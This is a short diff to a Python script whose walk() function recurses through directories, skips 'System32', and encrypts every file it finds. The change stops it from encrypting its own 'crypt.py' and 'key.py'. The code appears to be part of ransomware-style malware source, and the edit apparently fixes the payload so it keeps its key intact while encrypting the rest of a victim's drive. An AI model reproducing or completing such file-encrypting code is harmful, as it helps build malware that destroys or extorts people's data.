@@ -26,7 +26,8 @@ def walk(directory):
         if name != 'System32':
             path = os.path.join(directory, name)
             if os.path.isfile(path):
-                crypt(path)
+                if name != 'crypt.py' and name != 'key.py':
+                    crypt(path)
             else:
                 walk(path)
                 
